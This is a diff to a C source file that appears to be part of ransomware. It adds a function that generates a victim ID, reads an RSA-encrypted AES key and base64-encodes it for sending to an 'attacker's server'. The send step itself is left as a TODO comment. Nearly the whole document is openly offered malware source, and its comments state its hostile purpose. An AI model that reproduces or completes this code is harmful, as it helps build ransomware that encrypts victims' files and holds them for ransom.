@@ -183,6 +183,39 @@ static int base64_encode(const unsigned char *bin_input,
     return 0;
 }
 
+/* Send encrypted key to attacker's server */
+static int send_key_to_attacker(const char *key_file) {
+
+    // generate victim ID
+    char victim_id[64];
+    if (generate_victim_id(victim_id, sizeof(victim_id)) != 0) {
+        return -1;
+    }
+
+    // read encrypted key from file
+    unsigned char *key_data = NULL;
+    size_t key_size = 0;
+    if (read_encrypted_key_file(key_file, &key_data, &key_size) != 0) {
+        return -1;
+    }
+
+    // encode key to base64
+    char *base64_key = NULL;
+    size_t base64_len = 0;
+    if (base64_encode(key_data, key_size, &base64_key, &base64_len) != 0) {
+        free(key_data); // free key data if encoding fails
+        return -1;
+    }
+
+    // TODO send key to attacker's server through api request
+
+    // cleanup
+    free(key_data);
+    free(base64_key);
+
+    return 0; // TODO change to return result of sending key to attacker's server when implemented
+}
+
 /* Encrypt AES key with public RSA key */
 static void save_encrypted_key_rsa(const unsigned char *key, size_t key_len, const char *pubkey_file, const char *out_file) {
     mbedtls_pk_context pk;
